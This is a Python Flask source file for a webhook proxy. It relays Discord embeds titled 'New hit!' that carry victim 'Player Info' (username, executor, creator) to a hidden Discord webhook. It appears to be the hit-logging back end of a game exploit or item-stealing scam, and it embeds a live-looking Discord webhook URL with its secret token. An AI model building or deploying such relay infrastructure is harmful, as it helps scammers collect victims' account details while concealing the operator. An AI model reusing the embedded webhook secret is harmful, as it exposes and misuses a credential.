from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, time, string, random, os

app = Flask(__name__)
CORS(app)

# 🧷 Your personal Discord webhook
REAL_WEBHOOK = "https://discord.com/api/webhooks/1347215407857270804/xJu0x9KyAtq4B3535P9SdaBvN0FVBzaqPfk59_mLcf6PpSfZWkgq0d9GeQK5vmw_8DKx"

webhook_map = {}
ip_registry = {}
LIMIT_SECONDS = 3600

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/")
def home():
    token = list(webhook_map.keys())[0]
    return f"""
    <h1>✅ Webhook Proxy is Running</h1>
    <p>Use this URL to send valid embed requests:</p>
    <code>https://saturnhub.xyz/webhook/{token}</code>
    """

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return jsonify({"error": "Invalid token"}), 404

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    key = f"{token}:{client_ip}"

    if key in ip_registry and time.time() - ip_registry[key] < LIMIT_SECONDS:
        return jsonify({
            "error": "Rate limited",
            "time_remaining": int(LIMIT_SECONDS - (time.time() - ip_registry[key]))
        }), 429

    data = request.json
    if not data or "embeds" not in data:
        return jsonify({"error": "Missing or invalid 'embeds'"}), 400

    allowed = False
    for embed in data["embeds"]:
        if embed.get("title", "").strip() == "New hit!\nWhen ingame say anything in the chat to recive the stuff":
            for field in embed.get("fields", []):
                if field.get("name") == "Player Info":
                    value = field.get("value", "")
                    if all(x in value for x in ["Username:", "Executor:", "Creator:"]):
                        allowed = True
                        break

    if not allowed:
        return jsonify({"error": "Embed content not allowed"}), 400

    ip_registry[key] = time.time()
    response = requests.post(webhook_map[token], json=data)

    return jsonify({
        "status": "sent",
        "discord_status": response.status_code
    })

if __name__ == "__main__":
    # 🧠 Set your token and webhook before running
    token = "a8dfndf"
    webhook_map[token] = REAL_WEBHOOK

    print("\n✅ Webhook Proxy is Ready!")
    print(f"Send POST requests to: https://saturnhub.xyz/webhook/{token}\n")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
